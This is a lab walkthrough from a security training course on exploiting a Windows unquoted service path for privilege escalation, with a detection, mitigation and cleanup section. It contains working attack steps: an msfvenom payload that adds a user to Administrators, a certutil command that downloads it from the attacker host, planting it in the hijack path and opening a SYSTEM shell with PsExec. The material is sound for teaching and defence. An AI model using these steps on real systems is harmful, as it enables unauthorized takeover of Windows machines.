# Windows Unquoted Service Path to SYSTEM

> [!warning] Authorized use only
> Perform this lab **only** against systems you own or are explicitly permitted to test — your own isolated VMs/lab network. Running these techniques against systems without written authorization is illegal. Keep all lab VMs on a host-only / NAT network with no route to production or the internet unless the lab explicitly requires it.

**Module:** 09 · Privilege Escalation · **Difficulty:** Intermediate · **Time:** ~45–60 min

## Objective

Reproduce and exploit an **unquoted service path** on Windows. You will (as admin) stand up a deliberately vulnerable service whose `ImagePath` contains a space and an unquoted path, then — acting as a low-privileged user — detect the flaw with both **PowerUp** and manual `sc`/`wmic` techniques, confirm write access with `accesschk`, plant a malicious executable in the hijack path, and restart the service to execute your payload as **NT AUTHORITY\SYSTEM**.

## Prerequisites

- Understanding of how Windows resolves an unquoted `ImagePath` with spaces — see [Unquoted Service Path Vulnerability](../Services-Exploitation/Unquoted-Service-Path-Vulnerability.md).
- Familiarity with Windows services (`sc`, service accounts) and NTFS ACLs (`icacls`).
- Basic `msfvenom` payload generation — see [Windows Privilege Escalation](../README.md).
- Administrator access on the target **only for the one-time vulnerable-service setup**; the exploitation itself is performed as a standard user.

## Environment / Setup

**Topology:**

| Role | OS / Version | IP (example) | Purpose |
|---|---|---|---|
| Attacker | Kali Linux (latest) | `192.168.56.10` | Generate `msfvenom` payload, host it |
| Target | Windows 10 22H2 / Server 2019 | `192.168.56.20` | Hosts the vulnerable `VulnSvc` service |

**Network:** host-only `vboxnet0` — no production route.

**Tools required:**

| Tool | Purpose | Source |
|---|---|---|
| `sc.exe` | Create / query / start / stop the service | Built into Windows |
| `wmic` | Enumerate service `PathName` / start mode | Built into Windows (deprecated but present) |
| `icacls` | Inspect / grant NTFS ACLs | Built into Windows |
| `accesschk.exe` | Confirm writable directory as the low-priv user | Sysinternals |
| `PowerUp.ps1` | Automated unquoted-path detection | [PowerSploit / PowerShellMafia](https://github.com/PowerShellMafia/PowerSploit) |
| `msfvenom` | Generate the SYSTEM payload | Metasploit Framework (Kali) |

**Setup steps** (run **as Administrator** on the target, one time, to create the vulnerability):

```powershell
# --- ADMIN SETUP: build the intentionally vulnerable service ---
# 1. Create a path with a space and an "intermediate" directory the low-priv user can write to.
#    The leaf dir "Vuln Bin" ALSO contains a space, so Windows' unquoted-path resolution
#    will try C:\Program Files\Vuln Service\Vuln.exe (inside the writable dir) before the real exe.
New-Item -ItemType Directory -Force -Path "C:\Program Files\Vuln Service\Vuln Bin" | Out-Null

# 2. Drop a benign placeholder that behaves like the real service binary
Copy-Item C:\Windows\System32\cmd.exe "C:\Program Files\Vuln Service\Vuln Bin\service.exe"

# 3. Register the service with an UNQUOTED ImagePath containing a space.
#    NOTE: sc.exe requires a space after binPath= ; the value itself is NOT quoted.
sc.exe create VulnSvc binPath= "C:\Program Files\Vuln Service\Vuln Bin\service.exe" start= auto
sc.exe description VulnSvc "Deliberately vulnerable lab service (unquoted path)"

# 4. Loosen the ACL on the intermediate dir so a standard user can drop a file there
#    (simulates the real-world misconfiguration that makes the hijack possible)
icacls "C:\Program Files\Vuln Service" /grant "Users:(OI)(CI)(M)"
```

Verify the vulnerable state (still as admin):

```text
C:\> sc.exe qc VulnSvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VulnSvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        BINARY_PATH_NAME   : C:\Program Files\Vuln Service\Vuln Bin\service.exe
        SERVICE_START_NAME : LocalSystem
```

The `BINARY_PATH_NAME` is unquoted and contains a space — and the service runs as `LocalSystem`. That is the full vulnerability.

> [!note] Snapshot first
> Take a VM snapshot of the target now (named `clean`) so you can revert in *Cleanup*. From here on, act as a **standard (non-admin) user** — log in as, e.g., `lowpriv`.

## Walkthrough

> [!note] From this point you are the low-privileged user
> Every command below is run as `lowpriv` (a member of `Users` only). Confirm with `whoami /groups` that you are **not** in `BUILTIN\Administrators`.

### 1. Confirm your low-privilege context

```cmd
whoami
whoami /groups | findstr /i "Administrators"
```

```text
target\lowpriv
```

(No `Administrators` line is returned — you are a standard user.)

### 2. Detect the flaw with PowerUp (automated)

Pull `PowerUp.ps1` to the target (or host it from Kali with `python3 -m http.server 80` and download it), then run the dedicated check:

```powershell
powershell -ep bypass
Import-Module .\PowerUp.ps1
Get-UnquotedService
```

```text
ServiceName    : VulnSvc
Path           : C:\Program Files\Vuln Service\Vuln Bin\service.exe
ModifiablePath : @{ModifiablePath=C:\Program Files\Vuln Service; IdentityReference=TARGET\lowpriv;
                 Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'VulnSvc' -Path <HijackPath>
CanRestart     : True
Name           : VulnSvc
```

PowerUp confirms all three conditions in one shot: **unquoted path with a space**, a **`ModifiablePath` you can write to** (`WriteData/AddFile`), and the service runs as **`LocalSystem`**. `Invoke-AllChecks` would surface the same finding under *Unquoted Service Paths*.

### 3. Detect the flaw manually (no tooling)

If PowerUp is blocked by AV/AppLocker, enumerate with built-ins. List auto-start services whose path is unquoted and outside `C:\Windows`:

```cmd
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

```text
VulnSvc    C:\Program Files\Vuln Service\Vuln Bin\service.exe    Auto
```

The path has a space and no surrounding quotes — a candidate. Windows will attempt these images, in order, when starting the service:

```text
1. C:\Program.exe
2. C:\Program Files\Vuln.exe
3. C:\Program Files\Vuln Service\Vuln.exe
4. C:\Program Files\Vuln Service\Vuln Bin\service.exe
```

`C:\Program.exe` requires root-of-`C:` write access and `C:\Program Files\Vuln.exe` requires write access to `C:\Program Files\`; the interesting one is **`C:\Program Files\Vuln Service\Vuln.exe`** — dropping `Vuln.exe` into the writable `Vuln Service` directory makes Windows launch it as `...\Vuln.exe` before the real binary.

### 4. Confirm write access to the hijack directory

```cmd
accesschk.exe -accepteula -wvu "C:\Program Files\Vuln Service"
```

```text
RW TARGET\lowpriv
        FILE_ADD_FILE
        FILE_WRITE_DATA
        ...
```

`icacls` shows the same grant (the `(M)` / Modify inherited to `Users`):

```cmd
icacls "C:\Program Files\Vuln Service"
```

```text
C:\Program Files\Vuln Service BUILTIN\Users:(OI)(CI)(M)
                              NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                              BUILTIN\Administrators:(OI)(CI)(F)
```

You can write to `C:\Program Files\Vuln Service\`, so you can place `Vuln.exe`.

### 5. Generate the SYSTEM payload (on Kali)

Build a service-style payload. For a lab proof, add yourself to the local Administrators group:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators lowpriv /add" -f exe -o Vuln.exe
```

```text
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 267 bytes
Final size of exe file: 73802 bytes
Saved as: Vuln.exe
```

Transfer `Vuln.exe` to the target (SMB, HTTP, or `certutil -urlcache -f http://192.168.56.10/Vuln.exe Vuln.exe`).

### 6. Plant the payload in the hijack path

```cmd
copy Vuln.exe "C:\Program Files\Vuln Service\Vuln.exe"
```

```text
        1 file(s) copied.
```

### 7. Restart the service to trigger execution

Because the service is `start= auto`, a **reboot** always fires it; if your account can restart it directly, do so:

```cmd
sc stop VulnSvc
sc start VulnSvc
```

```text
[SC] StartService FAILED 1053:

The service did not respond to the start request in a timely fashion.
```

> [!note] Error 1053 is expected and harmless here
> Windows launched `C:\Program Files\Vuln Service\Vuln.exe` — your payload — which runs and exits rather than behaving like a real service, so the Service Control Manager reports a timeout. The payload has **already executed as SYSTEM** before the timeout is reported. If you cannot stop/start the service, trigger it with a reboot (`shutdown /r /t 0`); as an auto-start service it runs at boot.

## Expected Result

> [!success] Proof of success
> The service (running as `LocalSystem`) executed your `Vuln.exe`, which added `lowpriv` to the local Administrators group. After logging off and back on (to refresh the token), `lowpriv` is now a local administrator and can obtain a SYSTEM shell.

```text
C:\> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
lowpriv
The command completed successfully.
```

Escalate from the new admin rights to an interactive SYSTEM shell (e.g. via PsExec) to confirm:

```text
C:\> PsExec64.exe -accepteula -s -i cmd.exe
C:\Windows\system32> whoami
nt authority\system
```

## Detection & Blue-Team

- **Telemetry / log sources:**
  - **Security 4697** (*A service was installed in the system*) and **System 7045** (*A new service was installed*) — fire when `VulnSvc` is created and record the unquoted `ImagePath`.
  - **Sysmon Event ID 1** (*Process Create*) — shows the SCM parent `services.exe` spawning `C:\Program Files\Vuln Service\Vuln.exe`, i.e. a binary at an **intermediate path segment** rather than the registered full path.
  - **Sysmon Event ID 11** (*FileCreate*) — the low-priv user dropping `Vuln.exe` into `C:\Program Files\Vuln Service\`.
  - **Security 4732** (*A member was added to a security-enabled local group*) — records `lowpriv` being added to Administrators by the SYSTEM-run payload.
  - **System 7000/7009/7011** service-start-timeout errors (the 1053 above) correlate with the hijack.
- **Detection idea:** Alert when `services.exe` starts a child process whose full path does **not** exactly match the service's registered `ImagePath` — specifically a child ending in a filename that corresponds to a space-truncated segment (`...\Vuln.exe` for a service registered at `...\Vuln Service\Vuln Bin\service.exe`). Combine with an inventory query that flags any service whose `ImagePath` contains a space, is unquoted, and lives outside `C:\Windows`, cross-referenced against non-admin write access on any parent directory. A Sysmon 11 file-write of an `.exe` into `C:\Program Files\*` by a non-SYSTEM/non-TrustedInstaller account is a high-fidelity precursor.
- **Mitigation / hardening:**
  - **Quote every service `ImagePath`** — fix in place with `sc.exe config VulnSvc binPath= "\"C:\Program Files\Vuln Service\Vuln Bin\service.exe\""`.
  - Enforce correct **NTFS ACLs**: only Administrators/SYSTEM/TrustedInstaller should have write/add-file on `C:\` and every directory under `C:\Program Files\`. Remove the `Users:(M)` grant that made this possible.
  - Audit periodically (e.g. PowerUp `Get-UnquotedService`, WinPEAS, or a scheduled `wmic`/PowerShell inventory) and remediate findings.
  - Apply **least privilege** to service accounts (avoid `LocalSystem` where a scoped virtual/`gMSA` account suffices) and enable **AppLocker / WDAC** to block unauthorized binaries under `C:\Program Files\`.

## Cleanup

- Revert the target VM to the `clean` snapshot (fastest, guaranteed clean), **or** run the teardown below.
- Remove artifacts dropped on the target: the planted `Vuln.exe`, the lab service, the loosened ACL, and the group membership change; delete `Vuln.exe`/`PowerUp.ps1` from the attacker box.

```powershell
# --- ADMIN TEARDOWN (if not reverting the snapshot) ---
# Undo the privilege-escalation proof
net localgroup administrators lowpriv /delete

# Stop and remove the lab service
sc.exe stop VulnSvc
sc.exe delete VulnSvc

# Remove the planted payload and the whole vulnerable directory
Remove-Item -Force "C:\Program Files\Vuln Service\Vuln.exe" -ErrorAction SilentlyContinue
Remove-Item -Recurse -Force "C:\Program Files\Vuln Service"
```

```bash
# On Kali
rm -f Vuln.exe
```

## Troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| `sc create` fails with *"invalid binPath"* / no service appears | Missing space after `binPath=` / `start=` | `sc.exe` demands a space after each `=` and before the value: `binPath= "..."`. |
| `Get-UnquotedService` returns nothing | Path is actually quoted, has no space, or you registered it correctly by accident | Re-check with `sc qc VulnSvc`; the `BINARY_PATH_NAME` must be unquoted **and** contain a space. |
| `accesschk` shows no `RW` for your user | ACL grant didn't apply / wrong directory | Re-run the admin `icacls ... /grant "Users:(OI)(CI)(M)"`; verify with `icacls "C:\Program Files\Vuln Service"`. |
| `copy` to the path is *Access denied* | You are not in the writable directory, or UAC/AV quarantined the file | Confirm the `accesschk -wvu` result targets the same folder; disable the lab AV or exclude the path. |
| Payload plants but never runs on `sc start` | Payload dropped at the wrong truncation point — Windows only tries `C:\Program Files\Vuln Service\Vuln.exe`, not `...\Vuln Bin\Vuln.exe` | Confirm the leaf dir name has a space (`Vuln Bin`) so the truncated path lands inside the writable dir; plant exactly at `C:\Program Files\Vuln Service\Vuln.exe`. |
| Payload never runs on `sc start` | Service account/type prevents interactive start, or start fails before reaching your exe | Trigger via reboot (`shutdown /r /t 0`) — the `auto` service runs `Vuln.exe` at boot. |
| Added to Administrators but still not admin | Token not refreshed | Log off and back on (or reboot); the new group membership only applies to a new logon token. |

## References

- [Unquoted Service Path — HackTricks (Windows Local Privilege Escalation)](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unquoted-service-paths)
- [PowerSploit / PowerUp — `Get-UnquotedService` & `Write-ServiceBinary`](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
- [Microsoft Docs — Service Programming Tips (quote the ImagePath)](https://learn.microsoft.com/en-us/windows/win32/services/service-programming-tips)
- [Sysinternals AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
- [MITRE ATT&CK T1574.009 — Hijack Execution Flow: Path Interception by Unquoted Path](https://attack.mitre.org/techniques/T1574/009/)

## Related

- ROADMAP — where this lab fits in the curriculum
- [Windows Privilege Escalation](../README.md) — parent escalation context
- [Unquoted Service Path Vulnerability](../Services-Exploitation/Unquoted-Service-Path-Vulnerability.md) — the technique this lab practices
- [Services Exploitation](../Services-Exploitation/Services-Exploitation.md) — sibling service-misconfiguration vectors (insecure permissions, `binPath`, registry)
- [Privilege Escalation Tools](../Privilege-Escalation-Tools.md) — PowerUp / WinPEAS enumeration that flags this
